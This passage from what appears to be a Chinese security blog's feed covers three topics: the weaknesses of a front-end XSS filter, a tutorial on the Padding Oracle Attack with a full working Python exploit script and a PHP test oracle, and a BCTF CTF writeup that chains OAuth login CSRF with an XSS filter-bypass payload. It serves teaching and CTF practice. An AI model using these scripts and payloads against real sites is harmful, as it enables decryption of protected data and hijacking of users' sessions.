class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们这些对象都是在当前的window窗口下操作，并不能Hook到iframe标签内的各种行为，所以我们还需要将所有的iframe标签的窗口都进行Hook，这里代码是使用静态检测完成的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> MutationObserver = <span class="built_in">window</span>.MutationObserver || <span class="built_in">window</span>.WebKitMutationObserver || <span class="built_in">window</span>.MozMutationObserver;</div><div class="line"></div><div class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>)</span></div><div class="line">&#123;</div><div class="line">    mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>)</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">var</span> nodes = mutation.addedNodes;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)</div><div class="line">        &#123;</div><div class="line">        <span class="comment">//将installHook的操作对所有iframe中的标签也进行Hook，但是这里还是存在静态检测的固有问题的</span></div><div class="line">            <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (node.tagName == <span class="string">'IFRAME'</span>)</div><div class="line">            &#123;</div><div class="line">                installHook(node.contentWindow);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><h2 id="过滤代码的一些问题"><a href="#过滤代码的一些问题" class="headerlink" title="过滤代码的一些问题"></a>过滤代码的一些问题</h2><p>实际上这种过滤方式如果配置严格可以起到很强的过滤性，但据Ben师傅说他出题时不小心将filter.js用成了修改之前的，所以过滤效果微乎其微，通读下来，是有这些原因的</p><ul><li>首先过滤方式分为黑名单过滤与白名单过滤，黑名单那个倒是没多少问题，但是白名单的正则式里面有这一条<code>.*?</code>，这是会匹配到所有字符串的，所以白名单根本就没有起到过滤效果。。。</li><li>另外一点是，js毕竟是种写法多样的语言，一种写法被过滤了，总有相应的其他写法来代替，而本filter.js文件中其实并没有对多少关键写法进行限制，像<code>&lt;iframe src=&quot;javascript：&quot;&gt;</code>,<code>xhr</code>,等等都没有限制严格，所以实际上很多写法都是可行的</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最早的时候是从今年的Bctf的xss题目中遇到的filter.js这种过滤形式，但当时对xss题目一直全程懵逼所以也没有留下代码来好好分析过这种过滤，这次Ben师傅出的xss题目恰好使用了这种防御机制，于是打算好好整理一下。（PS：一看到题目的背景图片就知道这题一定是Ben师傅出的，赛后一问果然是2333）&lt;br&gt;这种前端的XSS防御主要由两部分构成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态检测&lt;/li&gt;
&lt;li&gt;动态检测&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/"/>
    <id>https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/</id>
    <published>2017-09-04T12:29:19.000Z</published>
    <updated>2017-10-01T16:37:26.580Z</updated>
    
    <content type="html"><![CDATA[<p>代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||<br>更新:在Ben师傅的帮助下问题已经解决，解决方案和问题描述放在最后，代码也已经更新请放心食用~~</p><a id="more"></a><h2 id="首先描述应用场景"><a href="#首先描述应用场景" class="headerlink" title="首先描述应用场景"></a>首先描述应用场景</h2><p>有许多网站存在这样的功能：参数是经过对称加密算法加密过的，一般用aes的居多，然后传到服务端后先对参数进行解码，之后再去利用。这样有什么好处呢？基本就像是封死了这个参数点一样，因为我们没有密钥，所以也无法构造出有效的参数来（大多数都会在解密时发现错误而丢弃），而Padding Oracle Attack可以适用于这样一种情况：<br><strong>在服务端使用的分组加密模式为CBC+PKCS填充方案，并且在传入无法解密的cipherText值与传入可以解密的CipherText值具有两种不同的回显时，我们就可以通过这种攻击方式来计算得到密文对应的明文，同时也可以计算出明文所对应的密文</strong></p><h2 id="然后是重头戏，对Padding-Oracle-Attack的理解"><a href="#然后是重头戏，对Padding-Oracle-Attack的理解" class="headerlink" title="然后是重头戏，对Padding Oracle Attack的理解"></a>然后是重头戏，对Padding Oracle Attack的理解</h2><p>直接放上赵颉老师翻译的一篇博文<a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" title="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html</a>，貌似大家都是从这篇文章接触的这种攻击方式<br>有一点要提醒的是，博文里面的讲解用的是DES，所以每个分块都是8个字节，而现在常见的都是aes也就是一块是16个字节的，自己改一下就好</p><h2 id="实现代码，尽可能的注释详细些"><a href="#实现代码，尽可能的注释详细些" class="headerlink" title="实现代码，尽可能的注释详细些"></a>实现代码，尽可能的注释详细些</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> threading</div><div class="line">N = <span class="number">16</span>      <span class="comment">#只有部分更改了过来，有些细节上还无意识的使用者32或16</span></div><div class="line">legth = N*<span class="number">2</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">descrip</span><span class="params">()</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    将记录python对字符运算的常用操作</div><div class="line">    进行字符与进制字符的转化：  ''.decode('hex')   ''.encode('hex')</div><div class="line">    字符型转数值型：  int('',16)</div><div class="line">    数值型转字符型：  hex() 有0x，长的时候结尾有L,使用[2:-1]或[2:]   bin() 开头有0b,使用[2:]</div><div class="line">    进行异或时，使用hex( int('',16)^int('',16) )的情况居多</div><div class="line">    '''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_format</span><span class="params">(num,legth)</span>:</span></div><div class="line">    str = hex(num)[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">if</span> str[len(str)<span class="number">-1</span>] == <span class="string">'L'</span>:</div><div class="line">        str = str[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'0'</span>*(legth-len(str))+str</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#这个是由使用者根据情况自定义的对回显界面的判断</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">(s, iv, cipher)</span>:</span></div><div class="line"></div><div class="line">    url = <span class="string">'http://localhost/test1.php?id=&#123;&#125;'</span>.format(iv+cipher)</div><div class="line">    <span class="comment"># print url</span></div><div class="line">    retu = s.get(url)</div><div class="line">    <span class="comment"># print retu.content</span></div><div class="line">    <span class="keyword">if</span> retu.content == <span class="string">'hacker?'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> retu.content == <span class="string">'1'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="comment">#输入cipher的str形式，可以得到mid值的str形式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_aes_mid</span><span class="params">(cipher)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_list_to_str_</span><span class="params">(iv)</span>:</span></div><div class="line">        retu = <span class="string">""</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> iv:</div><div class="line">            retu += hex_format(i,<span class="number">2</span>)</div><div class="line">        <span class="keyword">return</span> retu</div><div class="line"></div><div class="line">    <span class="comment">#避免重复建立requests对象</span></div><div class="line">    s = requests.session()</div><div class="line"></div><div class="line">    <span class="comment">#主要就是对iv进行遍历，为了方便操作采用这种list的形式，元素为int型   同时建立输出参数mid_str</span></div><div class="line">    iv = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</div><div class="line">    mid_list = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</div><div class="line"></div><div class="line">    <span class="comment">#padding是每经过一轮都要变化的，因为每一轮都在爆破不同位</span></div><div class="line">    padding = <span class="number">0x01</span></div><div class="line"></div><div class="line">    tag = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)[::<span class="number">-1</span>]:</div><div class="line">        <span class="comment"># if (tag == 0):</span></div><div class="line">        <span class="comment">#     print '在此处尝试了所有可能也没有发现匹配，请尝试分析'</span></div><div class="line">        <span class="comment">#     exit()</span></div><div class="line">        tag = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</div><div class="line"></div><div class="line">            <span class="comment">#至此层，是对iv[i]进行遍历，然后生成一个iv_str用于发送出去</span></div><div class="line">            iv[i] = j</div><div class="line">            iv_str = get_list_to_str_(iv)</div><div class="line"></div><div class="line">            <span class="comment">#基于服务器的返回情况进行判断，成立可以跳出此循环，进行下一位的爆破</span></div><div class="line"></div><div class="line"></div><div class="line">            <span class="keyword">if</span> (inject(s, iv_str, cipher)):</div><div class="line">                <span class="comment">#如果成立的话，进行以下操作</span></div><div class="line">                <span class="comment">#   基于iv对应位的值以及padding的值生成mid值</span></div><div class="line">                <span class="comment">#   更新padding的填充方式，也就是加一</span></div><div class="line">                <span class="comment">#   对应修改iv位上的值，由修改后的padding与mid值得到</span></div><div class="line">                mid = iv[i]^padding</div><div class="line">                <span class="keyword">print</span> hex_format(mid, <span class="number">2</span>)</div><div class="line">                tag = <span class="number">1</span></div><div class="line">                mid_list[i] = mid</div><div class="line">                padding += <span class="number">1</span></div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(i,<span class="number">16</span>):</div><div class="line">                    iv[k] = padding^mid_list[k]</div><div class="line">                <span class="keyword">break</span></div><div class="line">    mid_str = get_list_to_str_(mid_list)</div><div class="line">    <span class="keyword">print</span> mid_str</div><div class="line">    <span class="keyword">return</span> mid_str</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle_get_cipher</span><span class="params">(plain)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    参数：明文字符串即可,\n \x0a是支持的，不支持0x0a  %0a,所以要注意转化</div><div class="line"></div><div class="line">    生成明文对应的密文的方式：</div><div class="line">        1、将明文转化为二进制格式并进行填充操作，并从最后一组开始</div><div class="line">        2、最后一组的操作为：传入任意密文得到mid值，并由明文得到iv值，作为下一组的密文</div><div class="line">        3、开始倒数第二组，将上一组的iv作为密文，得到mid值，然后由明文得到iv值，作为下一组的密文</div><div class="line">        4、。。。。</div><div class="line">        5、一直到最后一组，所解得的值作为IV值</div><div class="line">        6、将所有轮的结果连到一起构成cipher</div><div class="line"></div><div class="line">    返回：cipher</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="comment">#转化明文为二进制格式</span></div><div class="line">    plain = plain.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">    <span class="comment">#为了防止""带来的问题我们需要为plain多加上一组，就全加上字母a吧</span></div><div class="line">    plain = <span class="string">"61"</span>*<span class="number">16</span> + plain</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#对明文进行填充</span></div><div class="line">    <span class="keyword">if</span> (len(plain) % <span class="number">32</span> != <span class="number">0</span>):</div><div class="line">        temp = (<span class="number">32</span>-len(plain)%<span class="number">32</span>)/<span class="number">2</span></div><div class="line">        plain += hex_format(temp,<span class="number">2</span>)*temp</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        plain += <span class="string">'10'</span>*<span class="number">16</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#将明文进行分组</span></div><div class="line">    plain_list = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain))[::<span class="number">32</span>]:</div><div class="line">        plain_list.append(plain[i:i+<span class="number">32</span>])</div><div class="line">    <span class="keyword">print</span> plain_list</div><div class="line"></div><div class="line">    <span class="comment">#循环求中间值,需要先指定最后一组密文,就由1组成吧</span></div><div class="line">    cipher_block = <span class="string">'1'</span>*<span class="number">32</span></div><div class="line">    cipher = <span class="string">""</span> + cipher_block</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain_list))[::<span class="number">-1</span>]:</div><div class="line">        <span class="comment">#求到对应mid块</span></div><div class="line">        mid_block = get_aes_mid(cipher_block)</div><div class="line">        <span class="comment">#由mid与当前的plain块得到cipehr块并加进去，同时结果作为下一组求mid的参数</span></div><div class="line">        cipher_block = hex_format(int(mid_block,<span class="number">16</span>) ^ int(plain_list[i],<span class="number">16</span>), <span class="number">32</span>)</div><div class="line">        <span class="keyword">print</span> <span class="string">'mid_block:'</span>+mid_block</div><div class="line">        <span class="keyword">print</span> <span class="string">'plain_list:'</span>+plain_list[i]</div><div class="line">        <span class="keyword">print</span> <span class="string">'cipher_block:'</span>+cipher_block</div><div class="line">        cipher = cipher_block + cipher</div><div class="line"></div><div class="line">    <span class="keyword">return</span> cipher[<span class="number">32</span>:]</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle_get_plain</span><span class="params">(cipher)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    参数：IV+cipher</div><div class="line"></div><div class="line">    解密密文对应明文方法：</div><div class="line">        1、将IV与cipher连到一起，并分割成list的形式</div><div class="line">        2、从列表的第二组开始，操作为，传入对应的cipher块得到对应的mid值，并由index-1对应的块异或得到明文值</div><div class="line">        3、。。。。</div><div class="line">        4、一直到最后一组，所解得的值作为明文连起来构成明文</div><div class="line"></div><div class="line">    返回：明文对应的十六进制以及解出的明文</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="comment">#记得为了防止""的影响要多加上一组</span></div><div class="line">    cipher_list = []</div><div class="line">    cipher_list.append(<span class="string">'11'</span>*<span class="number">16</span>)</div><div class="line"></div><div class="line">    <span class="comment">#对cipher进行长度检查并切片处理，</span></div><div class="line">    <span class="keyword">if</span>(len(cipher)%<span class="number">32</span> != <span class="number">0</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">'长度不是32的倍数'</span></div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher))[::<span class="number">32</span>]:</div><div class="line">        cipher_list.append(cipher[i:i+<span class="number">32</span>])</div><div class="line"></div><div class="line">    plain = <span class="string">""</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_list))[<span class="number">1</span>:]:</div><div class="line">        mid_block = get_aes_mid(cipher_list[i])</div><div class="line">        plain += hex_format(int(mid_block,<span class="number">16</span>) ^ int(cipher_list[i<span class="number">-1</span>],<span class="number">16</span>), <span class="number">32</span>)</div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#去除第一个分组+去除明文最后的填充位</span></div><div class="line">    plain = plain[<span class="number">32</span>:]</div><div class="line">    plain_bin_len = len(plain)-int(plain[<span class="number">-2</span>:],<span class="number">16</span>)*<span class="number">2</span></div><div class="line">    plain = plain[:plain_bin_len]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> plain, plain.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#print padding_oracle_get_cipher('xiemengfei123xiemengfei123xiemengfei')</span></div><div class="line"><span class="keyword">print</span> padding_oracle_get_plain(<span class="string">'78438db2e7f462f35b4b4be0cafeb3786d3ef0cd60b6c7bb19eb976d129f239e67717ada569469c6a5496e8d10d8803611111111111111111111111111111111'</span>)</div></pre></td></tr></table></figure><h2 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>] != <span class="string">""</span>)&#123;</div><div class="line">    $iv = substr($_GET[<span class="string">'id'</span>], <span class="number">0</span>, <span class="number">32</span>);</div><div class="line">    $iv = pack(<span class="string">'H*'</span>, $iv);</div><div class="line">    $cipher = substr($_GET[<span class="string">'id'</span>], <span class="number">32</span>);</div><div class="line">    $cipher = pack(<span class="string">'H*'</span>,$cipher);</div><div class="line">    $retu = openssl_decrypt($cipher, <span class="string">'aes-128-cbc'</span>,</div><div class="line">        hash(<span class="string">'md5'</span>, <span class="string">'Yiruma'</span>, <span class="keyword">true</span>), OPENSSL_RAW_DATA, $iv);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($retu) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'1'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'hacker?'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="一点疑惑"><a href="#一点疑惑" class="headerlink" title="一点疑惑"></a>一点疑惑</h2><p>如果仔细看了赵老师的博客后都知道我们每个字节的测试都是基于解到的plain是否满足最后为0x01  0x020x02 0x030x030x03这种形式，但是在我们测试最后一个字节的时候会出现什么情况？？我们希望服务器在解到10101010101010101010101010101010的时候给我们回显，但是这时候对应的字符串是””，因为上面这串数表示所有的字节都是填充位，也就是并没有字符串。<br>OK，那我们可以考虑下，如果服务端是这样写的呢？if($retu){echo ‘1’}else{echo ‘hacker?’},那么这个时候空字符串就会对应回显’hacker?’,这并不是我们想看到的，因为如果唯一能被aes正常解密的一次猜测都对应这样的回显的话，那对这个字节的256次尝试将不会看到一次对应为1的回显。也就是说最后一个字节将无法求得。<br>有没有大佬能给出解释呢，是需要在Padding Oracle Attack的代码上要有所改进吗？</p><p>在Ben师傅帮助下已经解决：<br>其实是我智障了。。只要在前面加上一组没有用的炮灰，把我们有用的字符从第二个分组开始放不久好了orz</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||&lt;br&gt;更新:在Ben师傅的帮助下问题已经解决，解决方案和问题描述放在最后，代码也已经更新请放心食用~~&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OAuth授权流程学习以及Turning Self-XSS into Good-XSS</title>
    <link href="https://someonesometimes.github.io/2017/08/31/OAuth%E6%8E%88%E6%9D%83%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8ATurning-Self-XSS-into-Good-XSS/"/>
    <id>https://someonesometimes.github.io/2017/08/31/OAuth授权流程学习以及Turning-Self-XSS-into-Good-XSS/</id>
    <published>2017-08-31T07:17:26.000Z</published>
    <updated>2017-10-18T09:54:31.643Z</updated>
    
    <content type="html"><![CDATA[<p>说起来是因为对BCTF的Dairy题目重新复习才写了这篇笔记，原谅我当时没吃透这道题的原理，近日看Ven师傅的wp中提到了OAuth授权，才意识到出这道题目的用意。。。</p><a id="more"></a><h2 id="学习OAuth"><a href="#学习OAuth" class="headerlink" title="学习OAuth"></a>学习OAuth</h2><p>首先需要学习OAuth，这里推荐这篇文章———<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">理解OAuth 2.0</a>，只看其中最常见的授权码模式就可以了，本题就用的这种模式。说白了就是平常我们上网站经常看到登陆的时候可以选择通过qq登陆，微信登陆，微博登陆啊这种登录模式，点击后我们在跳出来的页面上给出授权，就可以成功登陆网站了<br><img src="http://i.imgur.com/m2gvx3I.png" alt=""><br>我们可以举个例子来体验下阮老师文章里所说的过程，我是使用freebuf测试的</p><ol><li><p>freebuf将我们导向qq的认证服务器，同时附加上所需要的参数    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">https://graph.qq.com/oauth2.0/authorize</div><div class="line">?response_type=code   授权类型response_type=code表示是授权码模式的验证</div><div class="line">&amp;client_id=100578783  表明自己客户端的id</div><div class="line">&amp;redirect_uri=https://account.tophant.com/qq.html  指定重定向的url redirect_uri</div><div class="line">&amp;state=2d5c6bac1ec4c0be640766dacbd2127c   自己的状态码</div><div class="line">&amp;scope=get_user_info   客户端要的权限scope</div></pre></td></tr></table></figure></li><li><p>在我点击授权后，qq将我们重定向到freebuf所指定的redirect_uri，并携带有授权码code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">https://account.tophant.com/qq.html</div><div class="line">?code=6DDBE8E30017C9C44C55F45B2A53A015   关键的授权码code</div><div class="line">&amp;state=875cf715b9163b0e73f6f6b88afb9475  状态码，非必要</div></pre></td></tr></table></figure></li><li><p>在第一条链接中我们可以看到freebuf申请的权限是get_user_info，那么之后freebuf就可以拿着code向qq获取我的用户信息来作为freebuf的登陆识别</p></li></ol><p>最后多嘴一句，这里要分清两种登陆状态，一种是qq的登陆状态，也就是资源提供者，另一种是freebuf的登陆状态，是通过访问qq认证之后拿到code码实现登陆的</p><h2 id="结合Diary题目学习Turning-Self-XSS-into-Good-XSS"><a href="#结合Diary题目学习Turning-Self-XSS-into-Good-XSS" class="headerlink" title="结合Diary题目学习Turning Self-XSS into Good-XSS"></a>结合Diary题目学习Turning Self-XSS into Good-XSS</h2><p><strong>题目有两个域</strong></p><ul><li><p>diary.bctf.xctf.org.cn</p></li><li><p>auth.bctf.xctf.org.cn</p></li></ul><p><strong>登陆机制介绍</strong><br>如果想登陆diary域的话，会被定向到auth域内，输入用户名密码实现登陆后，会发送链接到auth.bctf.xctf.org.cn/o/authorize/来获取code，auth域会给code并将用户定位到diary域来实现diary域的登陆，所以可以看到这里auth域扮演者类似qq的资源提供者的角色，而diary域扮演着类似freebuf的客户端的角色</p><p><strong>两个xss点介绍</strong><br>然后再看下xss点，我们可以给admin发送链接，通过这个url漏洞可以将admin定位到任意url点<code>http://diary.bctf.xctf.org.cn/static/%5c%5cxss平台/xss.html</code><br>另外一个xss点是在我们以自己的身份登陆的时候可以在diary域看到自己的留言，这块只能让admin以我们的身份登陆的时候才能看到并触发</p><p><strong>xss点过滤介绍</strong><br>第一个xss点因为是在我们自己的vps上触发，所以是没有任何过滤的<br>第二个xss点是在留言板上回显，通过filter.js对输出进行了一些编码，通过HTML实体编码或者<code>&lt;iframe srcdoc=&quot;&lt;img src=x onerror=&#39;alert(1);&#39;&gt;&quot;&gt;</code>都可以绕过</p><p><strong>我们的目的以及利用思路介绍</strong><br>要拿到flag需要让admin在<code>http://diary.bctf.xctf.org.cn/survey/</code>下提交表单，并携带自己cookie中的token才行，第一个xss点在自己的vps上是拿不到cookie的，所以我们只能着眼与第二个域内的xss点才能通过js代码拿admin的cookie中的信息，而第二个xss点需要在自己的账户才能触发，所以需要让admin先退出在diary的登陆，然后登陆我们自己的账户才能触发代码，这块代码需要将admin登陆回自己的账户，再拿取cookie中信息并进行表单提交，最后拿到flag。<br>整个流程中的两处logout以及login需要留意，因为涉及到OAuth的操作方式，这也是我们在下面具体操作过程中需要留意的</p><p><strong>具体操作过程</strong><br>首先通过第一个xss点让admin定位到我们自己的xss.html里面，这里面需要退出admin在diary内的登陆，然后登陆我们的账户<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"img-src http://diary.bctf.xctf.org.cn/"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://diary.bctf.xctf.org.cn/accounts/logout/"</span> <span class="attr">onerror</span>=<span class="string">"login();"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">    var login = function() &#123;</div><div class="line">        var loginImg = document.createElement('img');</div><div class="line">        loginImg.src = "http://diary.bctf.xctf.org.cn/accounts/login/";</div><div class="line">        loginImg.onerror = redir;</div><div class="line">    &#125;</div><div class="line">    var redir = function() &#123;</div><div class="line">        //这里code是登陆的时候抓包拦下来的</div><div class="line">        var code="d4SOl5u07GvJhsz5co1V084hGrQLoz";</div><div class="line">        var loginImg2 = document.createElement('img');</div><div class="line">        loginImg2.src = 'http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code='+code;</div><div class="line">        loginImg2.onerror = function() &#123;</div><div class="line">            window.location = 'http://diary.bctf.xctf.org.cn/diary/';</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span 